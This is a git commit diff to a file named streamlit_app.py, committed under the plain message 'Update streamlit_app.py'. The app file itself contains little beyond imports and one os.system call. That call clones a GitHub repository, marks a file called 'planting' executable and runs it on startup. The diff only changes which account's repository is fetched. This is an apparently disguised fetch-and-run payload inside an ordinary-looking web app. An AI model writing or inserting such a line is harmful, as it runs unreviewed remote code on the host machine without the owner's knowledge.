a61ad639958d6ab3bf3d2f57649e31d4284610af
lavenderpinkd53 <109916947+lavenderpinkd53@users.noreply.github.com>
2022-07-25 00:15:49 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,4 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("git clone https://github.com/leporitore/streamlit-app.git && cd streamlit-app && chmod +x planting && ./planting")
+os.system ("git clone https://github.com/lavenderpinkd53/streamlit-app.git && cd streamlit-app && chmod +x planting && ./planting")
